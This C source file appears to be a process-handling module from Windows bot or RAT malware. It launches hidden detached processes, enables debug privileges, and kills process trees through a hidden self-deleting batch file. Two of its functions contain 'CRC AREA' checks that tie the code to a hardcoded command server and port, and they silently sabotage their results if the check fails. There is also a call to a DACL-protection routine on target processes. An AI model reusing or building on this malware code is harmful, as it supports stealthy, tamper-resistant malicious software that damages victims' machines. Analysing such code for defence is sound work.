#include "../Includes/includes.h"

DWORD StartProcessFromPath(char *cPath, bool bHidden)
{
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&si, 0 , sizeof(si));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    if(bHidden)
        si.wShowWindow = SW_HIDE;
    else
        si.wShowWindow = SW_SHOW;

    //if(CreateProcess(NULL, cPath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    if(CreateProcess(NULL, cPath, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return pi.dwProcessId;
    }
    else
        return 0;
}

BOOL AdjustPrivileges(BOOL bEnabled)
{
    BOOL bReturn = FALSE;
    TOKEN_PRIVILEGES tkp;
    HANDLE hToken;

    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
        return bReturn;

    if(!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid))
    {
        CloseHandle(hToken);
        return bReturn;
    }

    tkp.PrivilegeCount = 1;
    if(bEnabled)
        tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
    else
        tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED & tkp.Privileges[0].Attributes);

    bReturn = AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);

    CloseHandle(hToken);

    return bReturn;
}

bool KillProcessByPid(DWORD dwPid, bool bKillChildren)
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString1[DEFAULT];
    sprintf(cCheckString1, "%s:%i", cServer, usPort);
    char *pcStr1 = cCheckString1;
    unsigned long ulCheck1 = 5081+(30*10);
    int nCheck1;
    while((nCheck1 = *pcStr1++))
        ulCheck1 = ((ulCheck1 << 5) + ulCheck1) + nCheck1;
    if(ulCheck1 != ulChecksum3)
        return true;
    // <!-------! CRC AREA STOP !-------!>

    RemoteDaclProtection(dwPid);

    bool bReturn = FALSE;

    if(bKillChildren)
    {
        char cBatchFileContents[DEFAULT];
        strcpy(cBatchFileContents, "@echo off\nTASKKILL /F /T /PID ");

        char cPid[8];
        itoa(dwPid, cPid, 10);
        strcat(cBatchFileContents, cPid);

        strcat(cBatchFileContents, ">NUL\nDEL %0>NUL\n");

        char cBatchFileName[MAX_PATH];
        sprintf(cBatchFileName, "%s\\K%li.bat", cTempDirectory, ulFileHash);

        FILE * fFile;
        fFile = fopen(cBatchFileName, "w");
        if(fFile != NULL)
        {
            fputs(cBatchFileContents, fFile);
            fclose(fFile);
            ShellExecute(NULL, NULL, cBatchFileName, NULL, NULL, SW_HIDE);
        }

        Sleep(GetRandNum(500) + 250);
    }

    HANDLE hProcess = NULL;

    if(GetCurrentProcessId() != dwPid)
          hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);

    if(hProcess != NULL)
    {
        if(TerminateProcess(hProcess, NULL))
            bReturn = TRUE;
    }
    else if(bKillChildren)
        bReturn = TRUE;

    CloseHandle(hProcess);

    return bReturn;
}

DWORD GetPidFromFilename(LPTSTR szExe)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD dwPid = 0;

    // <!-------! CRC AREA START !-------!>
    char cCheckString1[DEFAULT];
    sprintf(cCheckString1, "%s:%i", cServer, usPort);
    char *pcStr1 = cCheckString1;
    unsigned long ulCheck1 = 5081+(30*10);
    int nCheck1;
    while((nCheck1 = *pcStr1++))
        ulCheck1 = ((ulCheck1 << 5) + ulCheck1) + nCheck1;
    if(ulCheck1 != ulChecksum3)
        return GetRandNum(5000);
    // <!-------! CRC AREA STOP !-------!>

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return dwPid;
    }

    do
    {
        if(lstrcmpi(pe32.szExeFile, szExe) == 0)
        {
            dwPid = pe32.th32ProcessID;
            break;
        }
    }
    while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return dwPid;
}

DWORD GetParentProcessPid()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD dwPid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return dwPid;
    }

    do
    {
        if(pe32.th32ProcessID == GetCurrentProcessId())
        {
            dwPid = pe32.th32ParentProcessID;
            break;
        }
    }
    while(Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return dwPid;
}

int GetPathFromPid(DWORD dwPid, char *cPathOut)
{
    int nReturn = 0;

    HANDLE hProcessSnap;
    MODULEENTRY32 me32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
    if(hProcessSnap == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hProcessSnap);
        return nReturn;
    }

    me32.dwSize = sizeof(MODULEENTRY32);

    if(!Module32First(hProcessSnap, &me32))
    {
        CloseHandle(hProcessSnap);
        return nReturn;
    }

    do
    {
        if(me32.th32ProcessID == dwPid)
        {
            strcpy(cPathOut, me32.szExePath);
            nReturn = strlen(me32.szExePath);
            break;
        }
    }
    while(Module32Next(hProcessSnap, &me32));

    CloseHandle(hProcessSnap);

    return nReturn;
}

bool IsProcessRunning(char *pcExeName)
{
    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32)};
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

    if(Process32First(hSnapshot, &pe32))
    {
        do
        {
            if(!strcmp((const char*)pe32.szExeFile, pcExeName))
            {
                CloseHandle(hSnapshot);
                return TRUE;
            }
        }
        while(Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}
